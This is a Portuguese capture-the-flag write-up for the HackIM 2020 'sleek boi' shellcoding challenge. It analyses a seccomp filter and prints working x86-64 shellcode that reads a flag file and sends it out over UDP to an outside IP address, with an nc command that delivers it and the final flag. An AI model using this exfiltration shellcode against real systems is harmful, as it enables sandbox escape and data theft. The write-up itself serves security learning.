# sleek boi


## Infos
**Descrição**: I don't talk, but I can be submissive

**Anexo**: [chall](attachments/chall)


## Análise do desafio 

Neste desafio recebemos um arquivo binário com as seguintes características:
<pre>
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
</pre>

Analisando estaticamente o anexo percebemos três funções interessantes. São elas:

- main 
- sub_D0E (**child_do**)
- sub_B74 (**setup_syscall_filter**)

### main

A função **main** mapeia uma região de memória de 16Kb com permissões de leitura, escrita e execução. Logo em seguida este espaço é preenchido com um buffer lido de *stdin*.

Após um *fork* bem-sucedido a função **child_do** é executada pelo processo filho tomando como argumento um ponteiro para a região mapeada acima.

<pre lang="c">
void main(int argc, char *argv[ ]){
  int v3, v4;
  __pid_t v5; 
  char *buf; 
  
  v3 = getpagesize();
  buf = mmap(0LL, -v3 & 0x4000, 7, 34, -1, 0LL);
  if ( !buf )
    __assert_fail("psc != NULL", "chall.c", 0x5Du, "main");
  fflush(stdout);
  v4 = getpagesize();
  buf[(signed int)read(0, buf, -v4 & 0x4000)] = -61;
  v5 = fork();
  if ( v5 < 0 )
    perror("fork");
  if ( v5 > 0 ){
    wait(0);
    exit(0);
  }
  child_do(buf);
}
</pre>

### child_do

A função **child_do** faz uma chamada para a função **setup_syscall_filter** (única diferença em relação ao desafio [meek boi](https://github.com/nullcon/hackim-2020/tree/master/pwn/meek_boi)).

Em seguida o *file descriptor* para */dev/null* é duplicado para *stdin*, *stdout* e *stderr* e o fluxo de execução é desviado para o espaço mapeado na função **main**. 

<pre lang="c">
void child_do(void (*f)()){
  unsigned int fd; // ST1C_4
  
  setup_syscall_filter();
  fclose(stdin);
  fclose(stdout);
  fclose(stderr);
  fd = open("/dev/null", 2);
  dup2(fd, 0);
  dup2(fd, 1);
  dup2(fd, 2);
  f();
  exit(0);
}
</pre>

### setup_syscall_filter

Em **setup_syscall_filter** são atribuídas, via *prctl*, restrições às chamadas de sistema que podem ser executadas pelo processo.

Utilizando a ferramenta [seccomp-tools](https://github.com/david942j/seccomp-tools) podemos visualizar facilmente quais *syscalls* estão sendo filtradas.


<pre lang="c">
0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
0002: 0x20 0x00 0x00 0x00000000  A = sys_number
0003: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0010
0004: 0x15 0x05 0x00 0x00000142  if (A == execveat) goto 0010
0005: 0x15 0x04 0x00 0x0000002a  if (A == connect) goto 0010
0006: 0x15 0x03 0x00 0x00000031  if (A == bind) goto 0010
0007: 0x15 0x02 0x00 0x0000002b  if (A == accept) goto 0010
0008: 0x15 0x01 0x00 0x00000120  if (A == accept4) goto 0010
0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0010: 0x06 0x00 0x00 0x00051234  return ERRNO(4660)
</pre>




## Solução

Este é um desafio clássico de *shellcoding*. Temos que passar para o *server* um payload que nos permita ler */home/pwn/flag*.
Para isso devemos contornar as seguintes restrições:

- não podemos interagir com *stdin*, *stdout* e *stderr*
- não podemos fazer chamada às *syscalls* filtradas em **setup_syscall_filter**

Na primeira versão deste desafio ([meek boi](https://github.com/nullcon/hackim-2020/tree/master/pwn/meek_boi)) é possível resolver através de uma simples *shell* reversa sob TCP. Mas, no [sleek boi](https://github.com/nullcon/hackim-2020/tree/master/pwn/sleek_boi), não podemos realizar ```bind```e ```connect```. Logo, temos que adotar outra estratégia. A alternativa que utilizei neste desafio foi exfiltrar a *flag* via ```SOCK_DGRAM``` utilizando a *syscall* ```sendto```.


<pre lang="asm">
; sm.asm
section .text
global _start

_start:
  ; just to ensure that the child process regs will not get in the way
  xor rax, rax
  xor rbx, rbx
  xor rcx, rcx
  xor rdx, rdx
  xor rdi, rdi
  xor rsi, rsi
  xor r8, r8
  xor r9, r9
  xor r10, r10
  xor r11, r11
  xor r12, r12
  xor r13, r13
  xor r14, r14
  xor r15, r15

 ; socket(PF_INET, SOCK_DGRAM, IPPROTO_IP)
  push byte 2
  pop rdi
  mov rsi, rdi
  xor rax, rax
  mov al, 0x29 ; __NR_socket
  syscall

  ; open("/home/pwn///flag", O_RDONLY)·
  mov r12, rax
  xor rsi, rsi
  push rsi
  push 1
  dec byte [rsp]
  mov rax, 0x67616c662f2f2f6e
  push rax
  mov rax, 0x77702f656d6f682f
  push rax
  mov rdi, rsp ; /home/pwn///flag
  xor edx, edx·
  xor esi, esi·
  push 2 ; __NR_open
  pop rax
  syscall

  ; read(fd, buf, 0x38)
  mov r11, rax ; flag fd to r11
  xor eax, eax ; __NR_read  = 0
  mov rdi, r11 ; flag fd
  push 0x38
  pop rdx
  sub rsp, 0x38 ; buf
  mov rsi, rsp
  syscall

  ;sendto(int sockfd, const void *buf, size_t len, int flags,
  ;      const struct sockaddr *dest_addr, socklen_t addrlen);
  lea r11, [rsp]
  mov rdx, rax ; len
  mov rax, 0x101010101010101
  push rax
  mov rax, 0x101010101010101 ^ 0x5a37e82c9a020002
  xor [rsp], rax
  mov r8, rsp ; {sa_family=AF_INET, sin_port=htons(666), sin_addr=inet_addr("44.232.55.90")}
  xor r10, r10·
  push r10
  push 1
  pop r10
  dec r10
  push 0x10
  pop r9 ; addrlen
  mov rsi, r11 ; buf
  mov rdi, r12 ; sockfd
  xor rax, rax
  mov al, 0x2c ; __NR_sendto
  syscall

  ; exit(0)
  xor rdi, rdi
  xor rsi, rsi
  xor rax, rax
  mov al, 0x3c
  syscall
</pre>

<pre lang='bash'>
$ nasm sc.asm -felf64 -o sc.o; ld sc.o -o sc
$ printf $(for i in $(objdump -d sc -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done) | nc pwn4.ctf.nullcon.net 5003
</pre>

### Flag
`hackim20{OMG_The_first_one_was_unintended}`
